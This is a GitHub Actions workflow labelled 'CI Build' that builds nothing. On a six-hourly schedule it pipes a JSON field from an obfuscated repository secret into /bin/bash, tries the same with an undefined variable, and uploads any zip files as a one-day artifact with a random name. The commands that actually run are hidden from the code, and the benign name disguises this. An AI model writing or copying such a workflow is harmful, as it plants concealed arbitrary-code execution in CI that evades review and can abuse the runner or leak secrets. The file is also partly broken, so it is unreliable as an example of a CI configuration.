name: CI Build
on:
  workflow_dispatch:

  schedule:
    - cron: '38 1,7,13,19 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  agent:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Perform
        env:
          ol57: ${{ secrets.ol57 }}
        run: |
          printf '%s' "$ol57" | jq -r .offu48 | /bin/bash
          printf '%s' "$hzwa244" | jq -r .apdga255 | /bin/bash

      - name: Upload results
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: DbL2J9HZ
          path: "*.zip"
          retention-days: 1
